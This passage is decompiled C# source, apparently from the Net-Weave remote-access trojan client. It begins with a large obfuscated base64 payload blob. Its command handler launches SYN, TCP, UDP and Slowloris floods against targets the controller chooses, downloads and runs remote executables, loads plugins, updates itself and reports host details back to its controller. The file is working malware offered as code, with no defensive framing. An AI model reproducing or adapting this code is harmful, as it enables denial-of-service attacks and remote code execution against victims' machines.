5/cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07X9ycnZ8eH15dZqXcnJ85n5ycnN+dO5/cnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07YBycnZ8eH15dZqVcnJ85n5ycnN+dO6AcnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnhycoN07YBycnZ8eH15dZqXcnJ85n5ycnN+dO6AcnJ2enmac3JynXx4eXBziHBzf3ufSpyFonVyonJycnlycoN07YFycnZ8eH15dZqVcnJ85nVycnR+dO6BcnJ2enmadHJynXx4eXBziHBzf3ufSpyFonVyonJycnlycoN07YFycnZ8eH15dZqXcnJ85nVycnR+dO6BcnJ2enmadHJynXx4eXBziHBzf3ufSpyFonVyonJycnpycoN07YJycnZ8eH15dZqVcnJ85nRycnR+dO6CcnJ2enmadXJynXx4eXBziHBzf3ufSpyFonVyonJycnpycoN07YJycnZ8eH15dZqXcnJ85nRycnR+dO6CcnJ2enmadXJynXx4eXBziHBzf3ufSpyFonVyonJycntycoN07YNycnZ8eH15dZqVcnJ85nZycnR+dO6DcnJ2enmadnJynXx4eXBziHBzf3ufSpyFonVyonJycntycoN07YNycnZ8eH15dZqXcnJ85nZycnR+dO6DcnJ2enmadnJynXx4eXBziHBzf3ufSpyFonVytnJycnxycoNydXx4iKB0nY907YFycnaGcHN9eZ+AdO2BcnJ2dHbheHJyeHKdj3TtgnJydoZwc315n4B07YJycnZ0duF0cnJ4cp1ynIWidXKPcnJyfXJyg3J07YNycnaGcHN8eJ+AdO2DcnJ2dHXhfHJyeHKccnJyhaJ1co9ycnJ9cnKDcnTtfnJydoZwc3x4n4B07X5ycnZ0huGYcnJ8cpxycnJ1onVyunJycnJycnJydO1+cnJ2hobhmHJyfHJ07X9ycnaGhuGYcnJ8cnTtgHJydoaG4ZhycnxydO2CcnJ2hobhdHJyeHJ07YNycnaGhuF8cnJ4cpyQdJqDcnJ8nLTFvLRzcnNycnJycn5ycnLopKCioKeiqaSpcnJycndy3nJycnZ7cnKV8HJy4ntyclJ5cnKVxebk2+DZ5XJycnLCg3JyenJycpXHxXLKg3JygnJycpW5x7u2cnJy2oNycgp0cnKVtN7h1HJycnJycnJ0cnJzyY8oe3t6cnJybJelcohycnNycnKXcnJye3JycoVycnKkcnJyo3JycphycnJ2cnJyhXJycn1ycnJzcnJyeHJycnNycnJ+cnJyjHJycnNycnJzcnJydHJycnZycnJycnxyc3JycnJyeHIIcgFyeHIacgFyeHIfcgFyeHIzcgFyeHJAcgFyeHKOcwFyeHK5c55zeHL0c8VzeHIRcwdzeHLOdAFyfHL3dOJ0eHJLdAFyeHJpdld2eHKAd1d2eHKdd1d2eHK8d1d2eHLVd1d2eHLud1d2eHIJd1d2eHIkd1d2eHJcdz13eHJwdz13eHJ+eFd2eHKXeFd2eHLHeLR42XLbeHJyeHIKeOp4eHIqeOp4eHJIeAFyeHJeeAdzeHJ7eep4eHKWeQFyeHKjeVd2eHK4eQFyeHIAeQFyeHIieRF5eHJFeQFycnJycnNycnJycnNyc3Jzc3JyiHKbcndyc3JzcnNzcnKicptyd3Jzcndyc3NycrRym3J3cnNye3Jzc3JyyXKbcntyc3J/cnNzcnLVcptye3J2cn9yc5KCctpym3J/cnlyf3JzcoJy5XKbcn9yfHKAcvNygnLwcptyf3J+coNyeHhkcpxyyPJscp9yyPJxcp9yeHhkcpxyyPJ5c61yyPKAc61yeHKHc7FyeHKTc7RyeHLAc7hyg3IEc8Nyg3Iec8dyc3JYdBByc3KZdRByc3K8dRByc3LfdRpyc3L8dSRyc3IcdS5yc3JddUByc3KAdkRycnJycnVy+Iomcnxyc3JycnJydXI4cyxygnJ1cnJycnJ1cjhzTnKKcndycnJycnVyOHNacpZye3JycnJydXL4iiZyfHJ8cnJycnJ1cjhzLHKCcn5ycnJycnVyOHNOcopygHJycnJydXI4c1pylnKEcnJycnJ1cviKJnJ8coVycnJycnVyOHMscoJyh3JycnJydXI4c05yinKJcnJycnJ1cjhzWnKWco1ywpJycnJy+Iomcr9yjnLaknJycnIIciFzy3KOckKScnJycghyK3PSco9yoZNycnJy+Iomcr9ykHJycnJycnI4fzdz2XKQcnJycnJycjh/QHPZcpBycnJycnJyOH9Qc9lykHJycnJycnI4f1tz3XKQcnJycnJycjh/bHPicpBycnJycnJyOH+EdOJykHJycnJycnI4f5Z04nKQcqqTcnJycvh6onTmcpBywZNycnJy+Hq4dOtykHJycnJycnI4f9Z08XKRcnJycnJycjh//HT2cpFyypNycnJy+HoKdPtykXLhk3JycnL4ehp0/3KRcuqTcnJycvh6KnQEcpJycnJycnJyOHczdL9yknJycnJycnI4dz50CXKSckCTcnJycjhzRnT/cpRyRpNycnJy+HpqdBRylXKClHJycnL4eoB1FHKWcr6UcnJycvh6oXUUcpdy+pRycnJy+HqtdRRymHI2lHJycnL4esR1FHKZcnKVcnJycvh60HUUcppyrpVycnJy+HrldR5ym3LqlXJycnL4eu91HnKcciaVcnJycvh6A3Uocp1yYpVycnJy+HoOdShynnKelnJycnL4eiV1MnKfctqWcnJycvh6MnUycqByFpZycnJy+HJCdThyoXJmlnJycnL4ckd163KjcpKXcnJycvhyUnW/cqRyvpdycnJy83Jbdb9ypHISl3JycnL2iiZyv3KkcnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3IUdnJydHIbdnJyc3IidnJydHJbdXJyc3IidnJydHJbdXJydXIpdnJydnIUdnJyc3IydnJyc3I5dnJyc3I+dnJyc3JAdnJyc3JAdnJyc3JGdnJydHJbdXJyc3JGdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JAdnJyc3JSdnJydHJbdXJyc3JbddtyJnJscuNyJnJscutyJnJscvNyJnJscvtyJnJscgNyJnJscgtyJnJschNyJnJschtyJnJxciNyJnJscityJnJscjNyJnJscjtyJnJ2c0tyJnJ8c1NyJnK/cltyJnK/cotyJnK/cn5yJnK/crtyJnK/crNyJnK/crNyIXOHc2NyZXi/crtya3iOc2Nyc3m/crtyJnKac7NyK3Ogc2tyJnK/cotym3m2c3tzrHm8c3NzynnFc3tz3HnOcyNy8HnZcqNyJnJscqNy+nm0cotzCXnfc5NzLnnrc4tzPnnfc9NyLHI+c3pyenKjcnpyfnKocnpyhnKjcnpyinKocqBylXJzdKBy7XLodKBypXKAdKBy5XLfdKByfXJGc6ByhXJSc6ByjXJtc6BynXJGc6ByrXJtc6ByvXJtc6ByxXKfdKBy1XLJdKBy3XLWdLN0TXKoctN0TXKocnJ1TXKocpJ1TXKocvJ1TXKochJ1TXKocpNzpnOtc7Jz13P9cwxzG3MqczRzOnN7cnNycnJYdKNycnKZdaNycnK8daNycnLfdX5ycnL8dXpycnIcdYJye3JzcnJynXZHcnJyonZHcnJyrnZHcnJytXZLcnJywnZQcnJy1nZQcnJy5HZQcnJy7HZUcnJyznRZcnJy/nZecnJyCHZjcnJyjnNncoJylXJ0cnpylHJ0cnRyg3J1coJyl3J2cnpylnJ2cnRyhHJ3cnpymHJ4coJymXJ4cnRyhXJ5coJym3J6cnpymnJ6cnRyhnJ7coJynXJ8cnpynHJ8cnRyh3J9coJyn3J+cnpynnJ+cnRyiHJ/cnRyiXKBcnRyinKDcnNyi3KDcnRyjHKFcnRyjXKHcnNyj3KJcnRyjnKJcnRykHKLcoFzdvJycnNycnJycnJycnJycnJy8HJycnRycnJycnJycnJycnNy+HJycnJydHJycnJycnJycnJyc3LidHJycnK7cvhzu3IHc7tyFnO7ciVzcnJyrr/h1ufe17Byu8Le59nb4KDW3t5ywefm4ufmt+jX4Oa60+DW3tfkcsLe59nb4HK74OLn5rfo1+DmutPg1t7X5HLE19XX2+jX1rfo1+DmutPg1t7X5HLC3ufZ2+DF5tPm13LF29bXcsLe59nb4LPk2eVyxdfk29Pe2+zX5HK7wt7n2dvgct/l1eHk3tvUcsXr5ebX33K/597m29XT5ea2197X2dPm13K34OffcsHU3NfV5nKg1ebh5HK74Ojh3ddyu7Pl6+DVxNfl597mcrPl6+DVtdPe3tTT1d1ytNfZ2+C74Ojh3ddycuSodrfg1rvg6OHd13Lo097n19HRcsDBwLdyxMfAwLvAuXK1vru3wMZyxbfEyLfEcrrX09bX5HK559vWcsLe59nb4Lnn29Zyxevl5tffoLXh3t7X1ebb4eDloLnX4Nfk29Vyvtvl5tKjcrbT5tNyxevl5tffoMTn4Obb39egxdfk29Pe2+zT5tvh4KC44eTf0+bm1+TloLTb4NPk63K02+DT5Ou44eTf0+bm1+Ry1Nhyxevl5tffoLvBcr/X3+Hk68Xm5NfT33Lf5XLF1+Tb097b7Ndyttfl1+Tb097b7Ndy2dfm0cDT39dy2dfm0bbX5dXk2+Lm2+HgctnX5tGz5+ba4eRy2dfm0bXn5OTX4ObF5tPm13LZ1+bRxebh4sHgttvl1eHg4NfV5tvh4HLZ1+bRt+rX1efm18HgvuHT1nLZ1+bRutPluOHk33LZ1+bRt+rX1efm18HgvuHT1rPk2eVy5dfm0bfq19Xn5tfB4L7h09az5NnlcsjX5OXb4eBy2dfm0cjX5OXb4eByxevl5tffoMnb4Nbh6eWguOHk3+VyuOHk33LZ1+bRu+Di5+a44eTfctnX5tHF5tPm18HU3NfV5nLl1+bRxebT5tfB1NzX1eZy2dfm0bnn29Zyu+Db5tvT3tvs13K36tfV5+bXcsXm4eJyt+jX4Oa60+DW3tfkcrfq19Xn5tvh4LXh3+Le1+bXctPW1tG36tfV5+bb4eC14d/i3tfm13Lk19/h6NfRt+rX1efm2+HgteHf4t7X5tdyxebT5ObX1nLT1tbRxebT5ObX1nLk19/h6NfRxebT5ObX1nLF5uHi4tfWctPW1tHF5uHi4tfWcuTX3+Ho19HF5uHi4tfWcrvg4ufmctPW1tG74OLn5nLk19/h6NfRu+Di5+Zywefm4ufmctPW1tHB5+bi5+Zy5Nff4ejX0cHn5uLn5nLE19XX2+jX1nLT1tbRxNfV19vo19Zy5Nff4ejX0cTX1dfb6NfWcsXX4NZyweDE19XX2+jX1nK36tfV5+bX1nLXcq636tfV5+bXweC+4dPWs+TZ5bDd0dG009Xd2+DZuNvX3tZyrsXm0+bXwdTc19XmsN3R0bTT1d3b4Nm429fe1nLA09/XcrbX5dXk2+Lm2+HgcrPn5trh5HK15+Tk1+DmxebT5tdyxebh4sHgttvl1eHg4NfV5tvh4HK36tfV5+bXweC+4dPWcrrT5bjh5N9yt+rX1efm18HgvuHT1rPk2eVyu+Di5+a44eTfcsXm0+bXwdTc19XmcuHU3NfV5nLf1+ba4dZy5dfg1tfkctXT3t7U09XdcuTX5efe5nLT5NnlctRy6NPe59dy5ebT5tfB1NzX1eZy5dvW13LF6+Xm19+gxNfY3tfV5tvh4HKz5eXX39Te68bb5t7Xs+bm5NvU5+bXcrPl5dff1N7rttfl1eTb4ubb4eCz5ubk29Tn5tdys+Xl19/U3uu14eDY29nn5NPm2+Hgs+bm5NvU5+bXcrPl5dff1N7rteHf4tPg67Pm5uTb1Ofm13Kz5eXX39Te68Lk4dbn1eaz5ubk29Tn5tdys+Xl19/U3uu14eLr5NvZ2uaz5ubk29Tn5tdys+Xl19/U3uvG5NPW19/T5N2z5ubk29Tn5tdys+Xl19/U3uu1597m5+TXs+bm5NvU5+bXcsXr5ebX36DE5+Dm29/XoLvg5tfk4eLF1+To29XX5XK14d/I2+Xb1N7Xs+bm5NvU5+bXcrnn29az5ubk29Tn5tdys+Xl19/U3uvI1+Tl2+Hgs+bm5NvU5+bXcrPl5dff1N7ruNve18jX5OXb4eCz5ubk29Tn5tdyxevl5tffoLbb09ng4eXm29XlcrbX1OfZ2dPU3tez5ubk29Tn5tdyttfU59nZ2+DZv+HW1+Vyxevl5tffoMTn4Obb39egteHf4tve1+TF1+To29XX5XK14d/i297T5tvh4MTX3tPq0+bb4eDls+bm5NvU5+bXcsTn4Obb39e14d/i0+bb1Nve2+brs+bm5NvU5+bXcsXX5NvT3tvs09Te17Pm5uTb1Ofm13LF5uTX099ytd7h5ddyxuGz5OTT63K22+Xi4eXXcrXh3+Lb3tfkudfg1+TT5tfWs+bm5NvU5+bXcsbr4tdyudfmxuvi13Kz5eXX39Te63K51+az5eXX39Te63LE5+Dm29/Xxuvi17rT4Nbe13K51+bG6+LXuOTh37rT4Nbe13K51+a15+Xm4d+z5ubk29Tn5tflctnX5tHI097n13K33+Lm63K2197X2dPm13K14d/U2+DXcsXr5ebX36DG2uTX09bb4Nlyu+Dm1+Te4dXd19ZyteHf4tPk17fq1drT4NnXcsTX3+Ho13K36Nfg5rPk2eVycnJycnWScnJycnJGjyFWwEIcswqRHZban6i0cnop7M7Ii6ZS+3eSdHOOinmSdHOEloSOfZJ2hIOEloSOhIeOd5Jzc4SDdHh6dXiDhnZycnJydnNycnJ1eIOKdHiAdXiDi3h4h4SPc451knJzdXiEk3V4hJd4cnOPd4SOeHJzhI6Pd3WScoB2knKDhnWScnR2knKEjneSc3OEjnaScoSbdpJyhJ91knKOdpJzc452knKDi3iSdHOOhI51eISjd5Jzc4SjdXiEfneSc3OEfnV4hHp3knNzhHp1eISCd5Jzc4SCeZJ0c4OKhI51eISOdHiOdZpygHaacoOGdZpydHaacoSOdppyhJt2mnKEn3Waco52mnKDi3aSc3OAdpJzc3R3knNzg9t2knNzeneHhI9zjniSdHOE6452knKPd3h5dI93j3d3knNzj3d3knOOhOt4eXSEjoSOdnlzhI51eXOOd5JyhPLzenJzhPL3hPLzenJzhPLzg/L7epJ0j46E8vN0eXl1j46Di3R9cnSE8v+E8v+E8v9+gnN1kHKCkHKQcpBydnxzhKN7eXaEo4SjhKN0dnxzhH57eXaEfoR+hH50dnxzhHp7eXaEeoR6hHp0dnxzhIJ7eXaEgoSChIJ0d3l0g4p0dXlzdHmSdHOOhPIHfXNyeMLe59nb4HJyjHNyh8DX5p/J19Po15LC3ufZ2+CStNPl13Jyd3NycnJyfnNyeerF297X4OZycpBzcou14eLr5NvZ2uaSNBuS6sXb3tfg5pKkoqOjcnKbc3KWqaWo06bXoqef1dSr15+m1KfYn6vW1qefpNPVqKvX2NWi1qurcnJ+c3J5o6CioKKgonJyenNyeXNycnJyenNyenJycnJykHNyc3LGdIjJ5NPiwOHgt+rV1+Lm2+Hgxtrk4enlc3JycnJycnKtQP7AcnJycnRycnLscnJyNqtycjaNcnLExbbF4un6MGzecr/1Jn991pzlI3RycnK1rM7H5dfk5c7A0+ba0+DOtuHV59/X4Oblzsjb5efT3pLF5ufW2+GSpKKjos7C5OHc19Xm5c7C5OHc19Xmkra24cXX5M7C3ufZ2+DO4dTczrbX1OfZzrvC3ufZ2+Cg4tbUcnJy2qxycnJycnJycnJy8KxycnKScnJycnJycnJycnJycnJycnJycnJycuKscnJycnJycnLRteHktt7ev9Pb4HLf5dXh5NfXoNbe3nJycnJycZdykrJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyc3KCcnJyinJy8nJycnJycnJycnJycnJyc3JzcnJyonJy8nJycnJycnJycnJycnJyc3JycnJyunJycsqycnKWdXJycnJycnJycnKWdaZycnLIcsVy0XLIcrdyxHLFcrtywXLActFyu3LAcrhywXJycnJyL3ZhcHJyc3JycnNycnJycnJyc3JycnJysXJycnJycnJ2cnJydHJycnJycnJycnJycnJycrZycnJzcshy03Lkcrhy23Lectdyu3Lgcthy4XJycnJylnJ2cnJyxnLkctNy4HLlct5y03Lmctty4XLgcnJycnJyciJ29nRycnNyxXLmcuRy23LgctlyuHLbct5y13K7cuBy2HLhcnJy0nRycnNyonKicqJyonKicqZy1HKicnJytnKIcnNytXLhct9y33LXcuBy5nLlcnJywHLXcuZyn3LJctdy03LoctdyknLCct5y53LZctty4HKScrRy03LlctdycnKicnpyc3K1cuFy33LictNy4HLrcsBy03LfctdycnJycupyxXLbct5y13LgcuZycnKqcnlyc3K4ctty3nLXcrZy13LlctVy5HLbcuJy5nLbcuFy4HJycnJywnLecudy2XLbcuBycnJycqJyenJzcrhy23LectdyyHLXcuRy5XLbcuFy4HJycnJyo3KgcqJyoHKicqByonJycqpyfnJzcrty4HLmctdy5HLgctNy3nLActNy33LXcnJyu3LCct5y53LZctty4HKgctZy3nLecnJyynKLcnNyvnLXctly03LecrVy4XLicuty5HLbctly2nLmcnJytXLhcuJy63Lkctty2XLacuZyknIbcpJy6nLFctty3nLXcuBy5nKScqRyonKjcqNycnJycrJyfnJzcsFy5HLbctly23LgctNy3nK4ctty3nLXcuBy03LfctdycnK7csJy3nLnctly23LgcqBy1nLect5ycnKicnlyc3LCcuRy4XLWcudy1XLmcsBy03LfctdycnJycsJy3nLnctly23LgcnJycnKmcnpyc3LCcuRy4XLWcudy1XLmcshy13LkcuVy23LhcuBycnKjcqByonKgcqJyoHKicnJyqnJ6cnNys3LlcuVy13LfctRy3nLrcpJyyHLXcuRy5XLbcuFy4HJycqNyoHKicqByonKgcqJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyonJyfnJycgKscnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycg==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs1 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class12 @class = sender as Class12;
		try
		{
			Class6 class2 = new Class6(e.Byte_0);
			switch (e.Enum3_0)
			{
			case Class12.Enum3.const_1:
				if (Class8.Boolean_0)
				{
					@class.method_9(Class8.String_0 + " Flood Already Active");
					return;
				}
				Class8.smethod_0(Class8.Enum2.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class8.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class12.Enum3.const_2:
				if (Class8.Boolean_0)
				{
					@class.method_9(Class8.String_0 + " Flood Already Active");
					return;
				}
				Class8.smethod_0(Class8.Enum2.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class8.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class12.Enum3.const_3:
				if (Class8.Boolean_0)
				{
					@class.method_9(Class8.String_0 + " Flood Already Active");
					return;
				}
				Class8.smethod_0(Class8.Enum2.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class8.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class12.Enum3.const_4:
				if (Class8.Boolean_0)
				{
					Class8.smethod_2();
					@class.method_9(Class8.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class12.Enum3.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class12.Enum3.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class12.Enum3.const_7:
				try
				{
					Class7.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class12).method_9("Restart Failed");
				}
				break;
			case Class12.Enum3.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class10.smethod_1(Convert.FromBase64String(Class1.string_10), bool_0: false)))
				{
					(sender as Class12).method_9("Invalid password");
					return;
				}
				if (Class1.bool_0)
				{
					foreach (GClass1 item in list_0)
					{
						item.method_3();
					}
					Class5.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class12.Enum3.const_9:
				try
				{
					if (GClass2.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass2.sortedList_1.Values[GClass2.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class1.bool_0)
						{
							text += " and Saved";
							GClass2.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass2.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class12.Enum3.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass2.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass2.sortedList_1[val.PluginGuid];
					GClass2.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class12.Enum3.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass2.sortedList_1.Count; i++)
					{
						if (GClass2.sortedList_1.Keys[i] == guid && (int)GClass2.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass2.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class12.Enum3.const_13:
				bool_0 = true;
				break;
			case Class12.Enum3.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class12.Enum3.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class12.Enum3.const_20:
				if (Class8.Boolean_0)
				{
					@class.method_9(Class8.String_0 + " Flood Already Active");
					return;
				}
				Class8.smethod_0(Class8.Enum2.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class8.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class12 @class = (Class12)sender;
		Class14 class2 = new Class14();
		class2.Write(Class9.smethod_1());
		class2.Write(Class2.smethod_0());
		class2.Write(Class1.string_7);
		class2.Write(Class10.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class1.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class3(Class12.Enum3.const_15, data).method_0());
		@class.method_3();
		Class11.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class12 @class = (Class12)sender;
		Class11.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass2.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass2.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

	private static void smethod_11(object sender, EventArgs2 e)
	{
	}

	private static void smethod_12(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class12).method_9(((IPlugin)((sender is IPlugin) ? sender : null)).get_Name() + ": Stopped");
			}
		}
		catch
		{
		}
	}

	private static void smethod_13(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class12).method_9(val.get_Name() + ": Started");
			}
		}
		catch
		{
		}
	}

	private static void smethod_14(IPlugin iplugin_0, PluginArgs pluginArgs_0)
	{
		try
		{
			pluginArgs_0.PluginGuid = iplugin_0.get_Guid();
			if (iplugin_0.get_StateObject() != null)
			{
				Class12 @class = iplugin_0.get_StateObject() as Class12;
				@class.method_7(new Class3(Class12.Enum3.const_12, Serializer.Serialize(pluginArgs_0)).method_0());
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("PLUGIN ERROR - Name: {0}, Error: {1}", iplugin_0.get_Name(), ex.Message);
			(iplugin_0.get_StateObject() as Class12).method_9(iplugin_0.get_Name() + ": Error");
		}
	}

	private static void smethod_15(object sender, EventArgs e)
	{
		IPlugin val = (IPlugin)((sender is IPlugin) ? sender : null);
		try
		{
			if (val.get_StateObject() != null)
			{
				(val.get_StateObject() as Class12).method_9(val.get_Name() + ": Executed");
			}
		}
		catch
		{
		}
	}

	private static void smethod_16(object object_0)
	{
		object[] array = (object[])object_0;
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[1] as Class12).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			Process.Start(fileName);
			webClient.Dispose();
			(array[1] as Class12).method_9("File Executed");
		}
		catch
		{
			(array[1] as Class12).method_9("Error Downloading File.");
		}
	}

	private static void smethod_17(object object_0)
	{
		object[] array = (object[])object_0;
		if (array[1].ToString() != Encoding.Default.GetString(Class10.smethod_1(Convert.FromBase64String(Class1.string_10), bool_0: false)))
		{
			(array[2] as Class12).method_9("Invalid password");
			return;
		}
		try
		{
			string fileName = Path.GetTempFileName() + ".exe";
			WebClient webClient = new WebClient();
			(array[2] as Class12).method_9("Downloading");
			webClient.DownloadFile((string)array[0], fileName);
			(array[2] as Class12).method_9("Updating");
			if (Class1.bool_0)
			{
				Class5.smethod_4();
			}
			(array[2] as Class12).method_10(bool_2: false);
			Process.Start(fileName);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			(array[2] as Class12).method_9("Error Updating");
		}
	}

	private static void smethod_18()
	{
		new Thread(smethod_19).Start();
	}

	private static void smethod_19()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("A Net-Weave client is running on this PC.\nPress OK to close the client.", "", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Process.GetCurrentProcess().Kill();
	}

	private static string smethod_20()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (text == "")
					{
						text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
							.ToString();
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch
		{
		}
		return string.Empty;
	}

	private static string smethod_21(string string_1)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(string_1);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}
}
